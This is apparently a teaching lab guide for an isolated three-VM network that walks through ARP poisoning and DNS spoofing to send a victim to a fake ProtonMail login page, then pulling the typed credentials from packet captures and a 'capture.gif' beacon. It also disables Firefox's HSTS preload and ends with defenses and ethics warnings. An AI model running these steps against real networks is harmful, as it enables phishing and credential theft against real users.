# Exercise 1: DNS Spoofing Attack

## Objective

Demonstrate a Man-in-the-Middle (MITM) attack using ARP + DNS spoofing to redirect a victim to a fake website and capture credentials.

## Attack Scenario

1. **Victim (VM1)** tries to access `protonmail.com`
2. **Attacker (VM2)** performs ARP spoofing to intercept traffic
3. **Attacker (VM2)** provides fake DNS response pointing to VM3
4. **Fake Server (VM3)** hosts a convincing fake ProtonMail login page
5. **Victim** enters credentials on fake site
6. **Attacker** captures credentials from network traffic

---

## Network Setup

### IP Configuration

| Machine | IP Address | Role |
|---------|-----------|------|
| Gateway/Router | 192.168.1.254 | Provides real DNS/routing |
| VM1 (Victim) | 192.168.1.10 | Client trying to access protonmail |
| VM2 (Attacker) | 192.168.1.20 | MITM - ARP + DNS spoofing |
| VM3 (Fake Server) | 192.168.1.30 | Hosts fake protonmail site |

### VirtualBox Network Setup

**For all 3 VMs:**
1. Settings → Network → Adapter 1
2. Attached to: **Internal Network**
3. Name: `mitm-lab` (same for all)
4. Advanced → Promiscuous Mode: **Allow All**

---

## Installation & Setup

### VM1 (Victim) Setup

```bash
# Transfer files to VM1
scp setup-vm1-victim.sh user@vm1:~/

# On VM1:
chmod +x setup-vm1-victim.sh
sudo ./setup-vm1-victim.sh
```

**Manual Firefox Configuration:**
1. Open Firefox
2. Navigate to `about:config`
3. Search for `network.stricttransportsecurity.preloadlist`
4. Double-click to set to `false`
5. This allows HTTP connections to normally HTTPS-only sites

### VM2 (Attacker) Setup

```bash
# Transfer files to VM2
scp setup-vm2-attacker.sh dnsmasq.conf dnsmasq.hosts start-attack.sh stop-attack.sh user@vm2:~/

# On VM2:
chmod +x *.sh
sudo ./setup-vm2-attacker.sh
```

### VM3 (Fake Web Server) Setup

```bash
# Transfer files to VM3
scp -r setup-vm3-webserver.sh fake-protonmail/ user@vm3:~/

# On VM3:
chmod +x setup-vm3-webserver.sh
sudo ./setup-vm3-webserver.sh
```

---

## Running the Attack

### Step 1: Verify Network Connectivity

**On all VMs, test ping:**
```bash
ping 192.168.1.254  # Gateway (may not respond, that's OK)
ping 192.168.1.10   # VM1
ping 192.168.1.20   # VM2
ping 192.168.1.30   # VM3
```

### Step 2: Check ARP Tables (Before Attack)

**On VM1 (Victim):**
```bash
arp -n
```

You should see the real MAC address of the gateway (192.168.1.254).

### Step 3: Start Fake Web Server (VM3)

**On VM3:**
```bash
cd ~
./start-webserver.sh
```

You should see:
```
Starting Fake ProtonMail Web Server
Listening on: http://192.168.1.30:80
```

Leave this running.

### Step 4: Test Fake Website Directly

**On VM1, open Firefox:**
```
http://192.168.1.30
```

You should see the fake ProtonMail login page. Close this tab.

### Step 5: Test Normal DNS (Before Attack)

**On VM1:**
```bash
dig protonmail.com
```

Should return the real ProtonMail IP (e.g., 185.70.40.x).

### Step 6: Launch DNS Spoofing Attack (VM2)

**On VM2:**
```bash
sudo ./start-attack.sh
```

You should see:
```
✓ IP forwarding enabled
✓ DNS redirection rule added
✓ IP masquerading enabled
✓ dnsmasq started successfully
✓ ARP spoofing active
✓ Capturing to: /tmp/dns-attack-YYYYMMDD-HHMMSS.pcap

✓ ATTACK IS NOW ACTIVE
```

### Step 7: Monitor Attack (Optional)

**On VM2, open new terminal:**

**Monitor DNS queries:**
```bash
sudo tail -f /var/log/dnsmasq.log
```

**Monitor network traffic:**
```bash
sudo tcpdump -i eth0 -n 'port 53 or port 80' -A
```

### Step 8: Check Poisoned ARP Table

**On VM1:**
```bash
arp -n
```

The MAC address for 192.168.1.254 (gateway) should now match VM2's MAC address (poisoned!).

### Step 9: Test DNS Spoofing

**On VM1:**
```bash
dig protonmail.com
```

Should now return `192.168.1.30` (our fake server) instead of real IP!

### Step 10: Access Fake ProtonMail

**On VM1, open Firefox:**
```
http://protonmail.com
```

⚠️ **You should now see the fake ProtonMail login page!**

### Step 11: Enter Fake Credentials

On the fake login page:
- Username: `victim@protonmail.com`
- Password: `SuperSecret123!`
- Click "Sign in"

The page will show a warning that you've been pwned.

### Step 12: Verify Credentials Were Captured

**On VM2 (attacker)**, check the tcpdump output or log:
```bash
# View the packet capture
sudo tcpdump -r /tmp/dns-attack-*.pcap -A | grep -i "user=\|pass="
```

You should see the credentials in plaintext!

**On VM3 (web server)**, check the terminal where the web server is running.
You should see HTTP GET requests containing the credentials:
```
GET /capture.gif?user=victim@protonmail.com&pass=SuperSecret123!
```

### Step 13: Stop the Attack

**On VM2:**
```bash
sudo ./stop-attack.sh
```

**On VM3:**
Press `Ctrl+C` to stop the web server.

---

## Analysis & Documentation

### 1. ARP Tables Comparison

**Before attack:**
```
Address          HWtype  HWaddress           Flags Mask  Iface
192.168.1.254   ether   08:00:27:xx:xx:xx   C           eth0
```

**During attack (poisoned):**
```
Address          HWtype  HWaddress           Flags Mask  Iface
192.168.1.254   ether   08:00:27:yy:yy:yy   C           eth0
                         ^^^^ This is VM2's MAC, not gateway's!
```

### 2. DNS Resolution Comparison

**Before attack:**
```bash
$ dig protonmail.com +short
185.70.40.11
```

**During attack:**
```bash
$ dig protonmail.com +short
192.168.1.30
```

### 3. Packet Capture Analysis

**On VM2, analyze the capture:**
```bash
# Find DNS queries
sudo tcpdump -r /tmp/dns-attack-*.pcap -n 'port 53'

# Find HTTP traffic with credentials
sudo tcpdump -r /tmp/dns-attack-*.pcap -A 'port 80' | less
```

**On VM3, analyze the web traffic:**
```bash
sudo tcpdump -r ~/captures/traffic.pcap -A 'port 80' | grep -C 5 "user=\|pass="
```

---

## Screenshots to Capture for Report

1. **VirtualBox network settings** showing Internal Network configuration
2. **IP configuration** on all 3 VMs (`ip addr show eth0`)
3. **ARP table before attack** on VM1 (`arp -n`)
4. **ARP table during attack** on VM1 (showing poisoned entry)
5. **DNS query before attack** on VM1 (`dig protonmail.com`)
6. **DNS query during attack** on VM1 (showing fake IP)
7. **Attack script output** on VM2 (showing successful start)
8. **Fake ProtonMail page** in Firefox on VM1
9. **dnsmasq log** on VM2 showing DNS queries
10. **Packet capture** showing credentials in plaintext
11. **Web server log** on VM3 showing captured credentials

---

## Troubleshooting

### Victim can't ping other VMs
- Verify all VMs use same Internal Network name in VirtualBox
- Check IP configuration: `ip addr show eth0`
- Ensure eth0 is up: `sudo ip link set eth0 up`

### DNS spoofing not working
- Check if dnsmasq is running on VM2: `ps aux | grep dnsmasq`
- Verify dnsmasq log: `sudo tail -f /var/log/dnsmasq.log`
- Check iptables rules: `sudo iptables -t nat -L -n -v`
- Ensure IP forwarding is enabled: `cat /proc/sys/net/ipv4/ip_forward` (should be 1)

### ARP spoofing not working
- Check if arpspoof is running: `ps aux | grep arpspoof`
- Verify ARP table on victim: `arp -n` (should show VM2's MAC for gateway)
- Try manual ARP entry on VM1: `sudo arp -s 192.168.1.254 <VM2-MAC-ADDRESS>`

### Fake website not loading
- Verify web server is running on VM3: `netstat -tln | grep :80`
- Check firewall on VM3: `sudo ufw status` (should be inactive)
- Test directly: `curl http://192.168.1.30` on VM2

### Firefox shows certificate error
- This should NOT happen since we're using HTTP not HTTPS
- If it does, check the URL - should be `http://` not `https://`
- Clear browser cache and retry

### "Connection refused" on victim
- Make sure attack is running on VM2
- Check if victim's DNS is set correctly: `cat /etc/resolv.conf`
- Try: `nslookup protonmail.com 192.168.1.20` (should return 192.168.1.30)

---

## Key Learning Points

1. **ARP has no authentication** - Any device can claim to be another device
2. **DNS has no built-in security** (without DNSSEC) - Fake responses are accepted
3. **HTTP transmits data in plaintext** - Credentials are visible in packet captures
4. **HTTPS/TLS is critical** - Prevents this attack by encrypting traffic and verifying server identity
5. **HSTS preload lists** - Modern browsers reject HTTP connections to sensitive sites
6. **Certificate pinning** - Apps can reject fake certificates even if CA is compromised

---

## Defense Mechanisms

1. **Use HTTPS everywhere** - Encrypts traffic, authenticates server
2. **HSTS (HTTP Strict Transport Security)** - Forces HTTPS connections
3. **Certificate pinning** - Reject unexpected certificates
4. **DNSSEC** - Cryptographically sign DNS responses
5. **Static ARP entries** - Prevent ARP spoofing (not scalable)
6. **Dynamic ARP inspection** - Network switches validate ARP packets
7. **VPN** - Encrypted tunnel prevents local network attacks
8. **Network monitoring** - Detect suspicious ARP traffic

---

## Ethical Considerations

⚠️ **This exercise is for EDUCATIONAL PURPOSES ONLY**

- Only perform on isolated lab environment
- Never attack networks you don't own/have permission to test
- DNS/ARP spoofing on real networks is illegal
- Credential theft is a serious crime
- Use this knowledge to DEFEND, not to attack

---

## References

- [ARP Spoofing - Wikipedia](https://en.wikipedia.org/wiki/ARP_spoofing)
- [DNS Spoofing - OWASP](https://owasp.org/www-community/attacks/DNS_Spoofing)
- [dnsmasq Documentation](http://www.thekelleys.org.uk/dnsmasq/doc.html)
- [arpspoof man page](https://linux.die.net/man/8/arpspoof)
